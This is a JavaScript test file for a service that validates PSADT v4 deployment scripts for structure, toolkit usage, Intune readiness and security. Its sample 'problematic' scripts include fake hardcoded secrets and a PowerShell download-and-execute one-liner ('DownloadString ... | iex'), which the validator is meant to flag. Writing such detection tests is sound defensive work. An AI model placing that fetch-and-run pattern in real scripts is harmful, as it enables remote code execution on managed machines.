import { describe, it, expect, beforeEach } from 'vitest';
import { getValidationService, resetValidationService } from '../services/validation.js';
// Sample valid PSADT v4.1.8 script for testing
const VALID_PSADT_SCRIPT = `
<#
.SYNOPSIS
    Test Application Deployment Script
.DESCRIPTION
    Deploys Test App using PSADT v4.1.8
.NOTES
    Version: 1.0.0
    Author: Test Author
#>

param(
    [string]$DeployMode = 'Interactive'
)

$adtSession = @{
    AppVendor = 'TestVendor'
    AppName = 'TestApp'
    AppVersion = '1.0.0'
}

Import-Module -FullyQualifiedName @{ ModuleName = 'PSAppDeployToolkit'; ModuleVersion = '4.1.8' }

try {
    $adtSession = Open-ADTSession @adtSession -PassThru

    if ($adtSession.DeployMode -eq 'Silent') {
        # Silent mode
    }

    Show-ADTInstallationWelcome -CloseProcesses @(@{ Name = 'testapp' }) -AllowDefer

    # Install the application
    Start-ADTMsiProcess -FilePath "$env:ProgramFiles\\TestApp\\installer.msi" -AdditionalArgumentList 'ALLUSERS=1'

    # Verify installation
    if (Test-Path 'HKLM:\\SOFTWARE\\TestVendor\\TestApp') {
        Write-ADTLogEntry -Message 'Installation verified'
    }

    Close-ADTSession
}
catch {
    Write-ADTLogEntry -Message "Installation failed: $_" -Severity 3
    Close-ADTSession -ExitCode 1
}

exit 0
`;
// Script with various issues
const PROBLEMATIC_SCRIPT = `
# No param block
# No module import
# No try/catch

Show-InstallationWelcome -CloseApps 'app'
Execute-Process -Path "C:\\Users\\john\\Downloads\\setup.exe"
Execute-MSI -Path "installer.msi"

$password = "secret123"
$apiKey = "sk-12345"

Invoke-Expression "some command"
(New-Object Net.WebClient).DownloadString('http://example.com') | iex

Read-Host "Enter value"
`;
// Script with some issues (mixed) - uses old function names
const PARTIAL_SCRIPT = `
param(
    [string]$DeployMode = 'Interactive'
)

Import-Module -Name PSAppDeployToolkit

try {
    Open-ADTSession

    # Using legacy function
    Execute-Process -Path "setup.exe" -Arguments "/S"

    Close-ADTSession
}
catch {
}
`;
describe('ValidationService', () => {
    let service;
    beforeEach(() => {
        resetValidationService();
        service = getValidationService();
    });
    describe('validatePackage', () => {
        it('should validate a correct PSADT script with no errors', async () => {
            const result = await service.validatePackage({
                script: VALID_PSADT_SCRIPT,
                level: 'standard',
            });
            expect(result.success).toBe(true);
            expect(result.result.isValid).toBe(true);
            expect(result.result.errorCount).toBe(0);
            expect(result.result.score).toBeGreaterThan(80);
        });
        it('should detect multiple issues in problematic script', async () => {
            const result = await service.validatePackage({
                script: PROBLEMATIC_SCRIPT,
                level: 'standard',
            });
            expect(result.success).toBe(true);
            expect(result.result.isValid).toBe(false);
            expect(result.result.errorCount).toBeGreaterThan(0);
            expect(result.result.totalIssues).toBeGreaterThan(5);
        });
        it('should include line numbers for issues', async () => {
            const result = await service.validatePackage({
                script: PROBLEMATIC_SCRIPT,
                level: 'standard',
            });
            const issuesWithLines = result.result.issues.filter(i => i.lineNumber !== undefined);
            expect(issuesWithLines.length).toBeGreaterThan(0);
        });
        it('should provide suggestions for all issues', async () => {
            const result = await service.validatePackage({
                script: PROBLEMATIC_SCRIPT,
                level: 'standard',
            });
            result.result.issues.forEach(issue => {
                expect(issue.suggestion).toBeDefined();
                expect(issue.suggestion.length).toBeGreaterThan(0);
            });
        });
        it('should calculate score correctly', async () => {
            const result = await service.validatePackage({
                script: VALID_PSADT_SCRIPT,
                level: 'basic',
            });
            // Score should be 100 minus penalties
            expect(result.result.score).toBeGreaterThanOrEqual(0);
            expect(result.result.score).toBeLessThanOrEqual(100);
        });
    });
    describe('validation levels', () => {
        it('should only check errors at basic level', async () => {
            const result = await service.validatePackage({
                script: PARTIAL_SCRIPT,
                level: 'basic',
            });
            // Should only have error-severity issues
            const nonErrors = result.result.issues.filter(i => i.severity !== 'error');
            expect(nonErrors.length).toBe(0);
        });
        it('should include warnings at standard level', async () => {
            const result = await service.validatePackage({
                script: PARTIAL_SCRIPT,
                level: 'standard',
            });
            const warnings = result.result.issues.filter(i => i.severity === 'warning');
            expect(warnings.length).toBeGreaterThan(0);
        });
        it('should include info at strict level', async () => {
            const result = await service.validatePackage({
                script: PARTIAL_SCRIPT,
                level: 'strict',
            });
            const infos = result.result.issues.filter(i => i.severity === 'info');
            expect(infos.length).toBeGreaterThanOrEqual(0);
        });
    });
    describe('structure rules', () => {
        it('should detect missing param block', async () => {
            const result = await service.validatePackage({
                script: 'Write-Host "Hello"',
                level: 'basic',
                categories: ['structure'],
            });
            const paramIssue = result.result.issues.find(i => i.ruleId === 'param-block-exists');
            expect(paramIssue).toBeDefined();
            expect(paramIssue.severity).toBe('error');
        });
        it('should detect missing try/catch', async () => {
            const result = await service.validatePackage({
                script: 'param() Write-Host "Hello"',
                level: 'basic',
                categories: ['structure'],
            });
            const tryCatchIssue = result.result.issues.find(i => i.ruleId === 'try-catch-exists');
            expect(tryCatchIssue).toBeDefined();
        });
        it('should detect unbalanced braces', async () => {
            const result = await service.validatePackage({
                script: 'param() try { Write-Host "Hello"',
                level: 'basic',
                categories: ['structure'],
            });
            const braceIssue = result.result.issues.find(i => i.ruleId === 'valid-powershell-structure');
            expect(braceIssue).toBeDefined();
        });
    });
    describe('PSADT rules', () => {
        it('should detect missing PSADT import', async () => {
            const result = await service.validatePackage({
                script: 'param() try { } catch { }',
                level: 'basic',
                categories: ['psadt'],
            });
            const importIssue = result.result.issues.find(i => i.ruleId === 'psadt-import-exists');
            expect(importIssue).toBeDefined();
        });
        it('should detect missing Open-ADTSession', async () => {
            const result = await service.validatePackage({
                script: `param()
        Import-Module -Name PSAppDeployToolkit
        try { } catch { }`,
                level: 'basic',
                categories: ['psadt'],
            });
            const initIssue = result.result.issues.find(i => i.ruleId === 'open-session-called');
            expect(initIssue).toBeDefined();
        });
        it('should detect missing Close-ADTSession', async () => {
            const result = await service.validatePackage({
                script: `param()
        Import-Module -Name PSAppDeployToolkit
        try { Open-ADTSession } catch { }`,
                level: 'basic',
                categories: ['psadt'],
            });
            const completeIssue = result.result.issues.find(i => i.ruleId === 'close-session-called');
            expect(completeIssue).toBeDefined();
        });
        it('should detect legacy v3 function usage', async () => {
            const result = await service.validatePackage({
                script: PROBLEMATIC_SCRIPT,
                level: 'standard',
                categories: ['psadt'],
            });
            const legacyIssue = result.result.issues.find(i => i.ruleId === 'uses-adt-prefix');
            expect(legacyIssue).toBeDefined();
            expect(legacyIssue.severity).toBe('warning');
        });
    });
    describe('security rules', () => {
        it('should detect hardcoded credentials', async () => {
            const result = await service.validatePackage({
                script: `param()
        try {
          $password = "mysecret123"
        } catch { throw }`,
                level: 'basic',
                categories: ['security'],
            });
            const credIssue = result.result.issues.find(i => i.ruleId === 'no-credentials');
            expect(credIssue).toBeDefined();
            expect(credIssue.severity).toBe('error');
        });
        it('should detect hardcoded user paths', async () => {
            const result = await service.validatePackage({
                script: `param()
        try {
          Copy-Item "C:\\Users\\john\\Downloads\\file.exe"
        } catch { throw }`,
                level: 'standard',
                categories: ['security'],
            });
            const pathIssue = result.result.issues.find(i => i.ruleId === 'no-hardcoded-paths');
            expect(pathIssue).toBeDefined();
        });
        it('should detect unsafe Invoke-Expression', async () => {
            const result = await service.validatePackage({
                script: `param()
        try {
          Invoke-Expression $command
        } catch { throw }`,
                level: 'standard',
                categories: ['security'],
            });
            const execIssue = result.result.issues.find(i => i.ruleId === 'safe-execution');
            expect(execIssue).toBeDefined();
        });
        it('should detect remote code execution patterns', async () => {
            const result = await service.validatePackage({
                script: `param()
        try {
          (New-Object Net.WebClient).DownloadString('http://example.com') | iex
        } catch { throw }`,
                level: 'basic',
                categories: ['security'],
            });
            const remoteIssue = result.result.issues.find(i => i.ruleId === 'no-downloadstring');
            expect(remoteIssue).toBeDefined();
            expect(remoteIssue.severity).toBe('error');
        });
    });
    describe('intune rules', () => {
        it('should warn about missing detection identifiers', async () => {
            const result = await service.validatePackage({
                script: `param()
        Import-Module PSAppDeployToolkit
        try {
          Open-ADTSession
          Start-ADTProcess -FilePath "setup.exe"
          Close-ADTSession
        } catch { throw }`,
                level: 'standard',
                environment: 'intune',
                categories: ['intune'],
            });
            const detectionIssue = result.result.issues.find(i => i.ruleId === 'detection-possible');
            expect(detectionIssue).toBeDefined();
        });
        it('should validate script with Close-ADTSession has exit code handling', async () => {
            const result = await service.validatePackage({
                script: `param()
        Import-Module PSAppDeployToolkit
        try {
          Open-ADTSession
          Close-ADTSession
        } catch { throw }`,
                level: 'standard',
                environment: 'intune',
                categories: ['intune'],
            });
            // Close-ADTSession is valid exit code handling
            const exitIssue = result.result.issues.find(i => i.ruleId === 'return-exit-code');
            expect(exitIssue).toBeUndefined();
        });
    });
    describe('environment filtering', () => {
        it('should apply intune-specific rules only for intune environment', async () => {
            const intuneResult = await service.validatePackage({
                script: PARTIAL_SCRIPT,
                level: 'standard',
                environment: 'intune',
            });
            const standaloneResult = await service.validatePackage({
                script: PARTIAL_SCRIPT,
                level: 'standard',
                environment: 'standalone',
            });
            // Intune should have intune-specific issues
            const intuneSpecific = intuneResult.result.issues.filter(i => i.category === 'intune');
            const standaloneIntune = standaloneResult.result.issues.filter(i => i.category === 'intune');
            expect(intuneSpecific.length).toBeGreaterThanOrEqual(standaloneIntune.length);
        });
    });
    describe('category filtering', () => {
        it('should only check specified categories', async () => {
            const result = await service.validatePackage({
                script: PROBLEMATIC_SCRIPT,
                level: 'standard',
                categories: ['security'],
            });
            result.result.issues.forEach(issue => {
                expect(issue.category).toBe('security');
            });
        });
        it('should check all categories when not specified', async () => {
            const result = await service.validatePackage({
                script: PROBLEMATIC_SCRIPT,
                level: 'standard',
            });
            const categories = new Set(result.result.issues.map(i => i.category));
            expect(categories.size).toBeGreaterThan(1);
        });
    });
    describe('passed checks', () => {
        it('should report rules that passed', async () => {
            const result = await service.validatePackage({
                script: VALID_PSADT_SCRIPT,
                level: 'standard',
            });
            expect(result.result.passedChecks.length).toBeGreaterThan(0);
            result.result.passedChecks.forEach(check => {
                expect(check.ruleId).toBeDefined();
                expect(check.ruleName).toBeDefined();
                expect(check.category).toBeDefined();
            });
        });
    });
    describe('summary generation', () => {
        it('should generate appropriate summary for valid script', async () => {
            const result = await service.validatePackage({
                script: VALID_PSADT_SCRIPT,
                level: 'basic',
            });
            expect(result.result.summary).toContain('passed');
        });
        it('should generate appropriate summary for invalid script', async () => {
            const result = await service.validatePackage({
                script: PROBLEMATIC_SCRIPT,
                level: 'basic',
            });
            expect(result.result.summary).toContain('failed');
            expect(result.result.summary).toContain('error');
        });
    });
    describe('score calculation', () => {
        it('should start at 100 and deduct penalties', async () => {
            const result = await service.validatePackage({
                script: PROBLEMATIC_SCRIPT,
                level: 'standard',
            });
            // Each error deducts 10, warning deducts 3, info deducts 1
            const expectedMaxDeduction = result.result.errorCount * 10 +
                result.result.warningCount * 3 +
                result.result.infoCount * 1;
            expect(result.result.score).toBe(Math.max(0, 100 - expectedMaxDeduction));
        });
        it('should never go below 0', async () => {
            const result = await service.validatePackage({
                script: PROBLEMATIC_SCRIPT,
                level: 'strict',
            });
            expect(result.result.score).toBeGreaterThanOrEqual(0);
        });
    });
    describe('best-practice rules', () => {
        it('should check for logging in strict mode', async () => {
            const result = await service.validatePackage({
                script: `param()
        Import-Module PSAppDeployToolkit
        try {
          Open-ADTSession
          Close-ADTSession
        } catch { throw }`,
                level: 'strict',
                categories: ['best-practice'],
            });
            const loggingIssue = result.result.issues.find(i => i.ruleId === 'has-logging');
            expect(loggingIssue).toBeDefined();
            expect(loggingIssue.severity).toBe('info');
        });
        it('should check for empty catch blocks', async () => {
            const result = await service.validatePackage({
                script: `param()
        try {
          Write-Host "test"
        } catch {
        }`,
                level: 'strict',
                categories: ['best-practice'],
            });
            const catchIssue = result.result.issues.find(i => i.ruleId === 'has-error-messages');
            expect(catchIssue).toBeDefined();
        });
    });
});
//# sourceMappingURL=validation.test.js.map